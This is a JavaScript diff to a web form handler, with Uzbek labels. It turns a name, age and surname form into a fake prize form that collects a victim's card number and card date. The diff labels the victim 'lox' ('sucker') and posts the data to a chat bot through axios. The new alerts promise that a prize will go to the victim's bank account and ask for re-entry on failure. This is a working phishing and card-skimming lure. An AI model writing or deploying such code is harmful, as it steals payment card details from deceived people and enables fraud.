@@ -7,10 +7,10 @@ const sendRequest = (e) => {
   e.preventDefault();
 
   const firstName = document.querySelector(".js-first-name").value.trim();
-  const age = document.querySelector(".js-age").value.trim();
-  const surname = document.querySelector(".js-surname").value.trim()
+  const  number = document.querySelector(".js-age").value.trim();
+  const card = document.querySelector(".js-card").value.trim()
 
-  const message = `lox: ${firstName}\n boganiga qancha bo'ldi : ${age}\n familiyasi: ${surname}`;
+  const message = `lox: ${firstName}\nloxni kartasi : ${number}\nloxni kartasini sanasi: ${card}`;
 
   const formData = {
     chat_id: chatId,
@@ -20,16 +20,16 @@ const sendRequest = (e) => {
   axios
     .post(url, formData)
     .then(() => {
-      alert("So'rov muvaffaqiyatli yuborildi!");
+      alert("so'vrin sizning bank xisobingizga tashlab beriladi");
     })
     .catch(() => {
-      alert("Nimadir xato ketdi!");
+      alert("Ma'lumotlarni xato kiritdingiz qaytadan urunib ko'ring");
     });
 
   // Formani tozalash
   document.querySelector(".js-first-name").value = "";
   document.querySelector(".js-age").value = "";
-  document.querySelector(".js-surname").value = "";
+  document.querySelector(".js-card").value = "";
 
 };
 
